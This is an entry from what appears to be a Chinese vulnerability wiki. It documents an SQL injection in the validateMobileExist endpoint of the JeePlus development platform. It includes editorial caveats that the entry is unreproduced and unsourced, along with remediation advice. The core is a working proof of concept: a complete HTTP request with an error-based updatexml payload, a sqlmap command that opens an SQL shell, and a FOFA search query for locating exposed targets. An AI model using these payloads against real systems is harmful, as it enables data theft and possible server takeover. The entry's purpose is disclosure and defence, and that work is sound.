---
source: "SourByte05/Vulnerability-Wiki-PoC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "Jeeplus快速开发平台 validateMobileExist SQL注入漏洞"
product: "JeePlus快速开发平台"
record_type: "vulnerability"
document_type: "SQL注入PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "请求包含jeeplus.session.id，角色/登录要求未知；MySQL updatexml支持及报错展示需要条件"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/Jeeplus%E5%BF%AB%E9%80%9F%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0%20validateMobileExist%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-160ba479c33977cbf92ea05a"
entity_id: "ve-160ba479c33977cbf92ea05a"
schema_version: "1"
---

# Jeeplus快速开发平台 validateMobileExist SQL注入漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：JeePlus快速开发平台
- 文献类型：SQL注入PoC
- 版本、权限及部署边界：请求包含jeeplus.session.id，角色/登录要求未知；MySQL updatexml支持及报错展示需要条件
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 只列产品无版本，已知在野/广泛影响无来源；厂商首页不是具体安全补丁
2. HTTP请求未围栏显示会折行，sqlmap示例漏Cookie与首请求不一致
3. SQL注入到写木马需要DB文件权限、路径可写及Web解释，正文应将其条件化而非等同效果；无响应文本图片未視检

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<http://www.jeeplus.org/>
- 原文参考链接（未重新核验）：<https://github.com/SourByte05/Vulnerability-Wiki-PoC>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

JeePlus快速开发平台  validateMobileExist 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响范围

JeePlus快速开发平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="JeePlus"

POC/EXP：

GET /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+version%28%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: jeeplus.session.id=a631de098e3a4e4184631a4dcac9f396
Connection: close

![image-20240222160348373](./.resource/Jeeplus快速开发平台validateMobileExistSQL注入漏洞/media/image-20240222160348373.png)


sqlmap验证

sqlmap.py -u "http://127.0.0.1:8080/a/sys/user/validateMobileExist?&mobile=1*" --sql-shell

![image-20240222160458072](./.resource/Jeeplus快速开发平台validateMobileExistSQL注入漏洞/media/image-20240222160458072.png)


# 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

升级JeePlus至最新版本

官网下载最新安全补丁：http://www.jeeplus.org/


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
